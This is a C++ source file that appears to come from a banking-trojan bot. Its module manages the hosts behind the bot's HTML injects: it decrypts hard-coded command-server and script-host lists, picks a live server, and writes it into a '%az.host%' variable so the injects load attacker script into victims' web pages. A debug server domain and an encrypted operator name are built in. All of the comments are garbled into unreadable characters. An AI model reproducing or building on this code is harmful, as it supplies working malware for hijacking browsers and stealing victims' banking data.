//---------------------------------------------------------------------------
#pragma hdrstop


#include "Modules.h"


#ifdef AzConfigH
	//****************************************
	//   ���� ������� � ������ �������
	//   ���������� ��������� ���������
	//****************************************
//	#define USE_AZ_CONFIG
    #define USE_AZ_USER
#endif


#include "Strings.h"
#include "Config.h"
#include "Utils.h"
#include "BotHosts.h"
#include "BotDef.h"
#include "BotConfig.h"
//-----------------------------------------------------------------------------


// ���������� ������ ������
namespace AZDATA
{
	DWORD PID = 0; 				  // ������������ �������� � ������� �������� ������
	THostChecker *Checker = NULL; // ������� �������� ����������������� ������

    char Variable_ScriptHost[] = {'%','a','z','.','h','o','s','t','%', 0};;
}


//*******************************************************
// ��� ������������ ��� �������� ���� ������
//*******************************************************
#ifdef USE_AZ_USER
	char AZ_USER[AZCONFIG_PARAM_SIZE_AZUSER] = AZCONFIG_PARAM_NAME_AZUSER;
#endif


string GetAzUser()
{
	// ������� ���������� ��� ������������ ��� ������ ����������

	string User;

    #ifdef USE_AZ_USER
		#ifndef DEBUGCONFIG
			User = AZ_USER;
			if (AZCONFIG_PARAM_ENCRYPTED_AZUSER)
				DecryptStr(User.t_str(), User.t_str());
		#else
			User = "test";
		#endif //DEBUGCONFIG
	#endif //USE_AZ_USER
	return User;
}


//-------------------------------------------------------



#ifdef USE_AZ_CONFIG

	char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;

	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */


	//*****************************************************************
	//  �����, ������� ����� ��������� � HTML �������
	//*****************************************************************
	#ifdef DEBUGCONFIG
		// ���������� ������
		char AZ_SCRIPTS_HOSTS[] = "rus.zika.in\0";
	#else
		// ������� ������
		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
	#endif

	#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */



//----------------------------------------------------
// GetAzHost - ������� ���������� ������ ������� ����
// �� ������� ������ ������� AZ
//----------------------------------------------------
string GetAzHost()
{
	#ifdef USE_AZ_CONFIG
		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
	#else
    	return GetActiveHost2();
	#endif
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  GetAzURL - ������� ���������� ������ ����� ��
//   ������ ����� ������� � ����������� ����
//----------------------------------------------------
string GetAzURL(const char*  Path)
{
	string Host = GetAzHost();
	if (Host.IsEmpty()) return Host;
	TURL URL;
	URL.Host = Host;
	URL.Path = Path;

    return URL.URL();
}
//-----------------------------------------------------------------------------

//----------------------------------------------------
//  AzInicializeHostChecker - ������� ��������������
//  ������� �������� ������
//----------------------------------------------------
void AzInicializeHostChecker()
{
	if (IsNewProcess(AZDATA::PID))
	{
		// ������ � ����� ��������
		#ifdef DEBUGCONFIG
        	bool Encrypted = false;
		#else
        	bool Encrypted = AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS;
		#endif
		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
    }
}
//-----------------------------------------------------------------------------

void AZInjectActivated(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// ������ �������� �������� �����
    AzCheckScriptHosts();
}


void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	// ������������� �������� �����
	TBotConfig* Config = Config::GetConfig();
	if (Config && AZDATA::Checker)
	{
		string Host = AZDATA::Checker->GetWorkHost();
		if (Host.IsEmpty())
			Host = AZDATA::Checker->FirstHost;
		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
	}
}

void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
{
	if (!Sender) return;

	THTMLInjectList* Injects = (THTMLInjectList*)Sender;

	// ���������� ��� ������� � ������� ��������  ������ ����������
	TLock L = Injects->GetLocker();


	int Count = Injects->Count();
	for (int i = 0; i < Count; i++)
	{
		THTMLInject *Inject = Injects->Items(i);
		if (Inject->ContainVariable("%az.host%"))
		{
			// ������������ � ������� � �������� ��� ���������
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_ACTIVATED, AZInjectActivated);
			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_EXECUTE, AZInjectExecute);
		}

	}
}



//----------------------------------------------------
// AzCheckScriptHosts - ������� ��������� ��������
// ������ ��������� � HTML �������
//----------------------------------------------------
void AzCheckScriptHosts()
{
	// �������������� ��������
	AzInicializeHostChecker();

	AZDATA::Checker->Check();
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
// AzGetScriptHost - ������� ����������  ������� ����
// ��� ������ � HTML �������
//----------------------------------------------------
string AzGetScriptHost()
{
	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
		return NULLSTR;

	// �������������� ����� ������
	AzInicializeHostChecker();

	// ����������� ������� ����
	return AZDATA::Checker->GetWorkHost();
}



//-----------------------------------------------------------------------------
#endif


//----------------------------------------------------
//  AzInizializeHTMLInjects  - ������� ��������������
//  ������� ������� ������ � HTML ��������
//----------------------------------------------------
void AzInizializeHTMLInjects()
{
	#ifdef USE_AZ_CONFIG
	// ���������� ������� � ���� � ��� ��������� ���������
	TBotConfig* Config = Config::GetConfig();
	if (Config)
	{
		// ������������ � ������� �������� HTML ��������
		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
	}
	#endif
}
//-----------------------------------------------------------------------------


